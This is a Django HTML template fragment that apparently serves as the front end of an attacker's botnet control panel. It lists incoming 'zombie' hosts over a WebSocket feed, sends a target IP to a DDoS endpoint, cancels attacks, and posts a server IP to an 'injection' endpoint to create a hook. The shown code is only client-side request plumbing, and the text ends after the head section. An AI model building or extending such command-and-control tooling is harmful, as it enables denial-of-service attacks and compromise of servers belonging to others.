<!doctype html>
<meta charset="UTF-8">



<html>


<head>


	<script type="text/javascript" src="{{ STATIC_URL }}js/ws4redis.js"></script>
	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

<script>




//cookie setup for posts
    $(function ajax_setup(){
            //get cookie for form posting
            function getCookie(name) {
                var cookieValue = null;
                if (document.cookie && document.cookie != '') {
                    var cookies = document.cookie.split(';');
                    for (var i = 0; i < cookies.length; i++) {
                        var cookie = jQuery.trim(cookies[i]);
                        // Does this cookie string begin with the name we want?
                        if (cookie.substring(0, name.length + 1) == (name + '=')) {
                            cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                            break;
                        }
                    }
                }
                return cookieValue;
            }

            var csrftoken = getCookie('csrftoken');
						console.log(csrftoken);
            function csrfSafeMethod(method) {
                // these HTTP methods do not require CSRF protection
                return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
            }


            $.ajaxSetup({
                beforeSend: function(xhr, settings) {
                    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
                        xhr.setRequestHeader("X-CSRFToken", csrftoken);
                    }
                }
            })
        }
    )

$(function(){
	solo_socket = WS4Redis({
		uri:'{{WEBSOCKET_URI}}attacker?subscribe-session',
		receive_message:msghandler,
		heartbeat_msg: "--heartbeat--",
	});
});


function msghandler(json){

	if(json.hasOwnProperty('newZombie')){

		$('tr:first').append("<td>"+json['newZombie']);
	}
}



function ddos(){

	var targ = $("#target").val()
	$.ajax({
		url:"{% url 'control-DDOS'%}",
		type:'POST',
		dataType:"json",
		data:{'targetip':targ}
	});
}

function cancel(){
		$.ajax({
			url:"{% url 'control-Cancel'%}",
			type: 'POST',
			dataType: "json",
			data:{}
		});

}

function createHook(){
	var ipserver = $('#server_ip').val()
	$.ajax({
			url: "{%url 'injection'%}",
			type: 'POST',
			dataType: "json",
			data:{'server_ip':ipserver},
			success: function(json){


				alert(json['resp'])
			}
	});
}



</script>

</head>
